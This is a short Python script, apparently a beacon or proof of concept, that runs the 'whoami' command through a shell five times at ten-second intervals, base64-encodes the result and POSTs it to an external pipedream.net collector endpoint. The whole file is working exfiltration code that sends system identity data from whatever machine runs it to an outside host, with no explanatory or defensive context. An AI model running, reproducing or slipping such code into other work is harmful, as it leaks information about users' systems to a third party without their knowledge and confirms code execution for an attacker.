import subprocess, base64, requests, time

for i in range(5):
    time.sleep(10)
    output = subprocess.check_output('whoami', shell=True)
    b64_output = base64.b64encode(output)
    data={'data':b64_output}
    requests.post('https://enb3v0cqs6dwu.x.pipedream.net/', data=data)
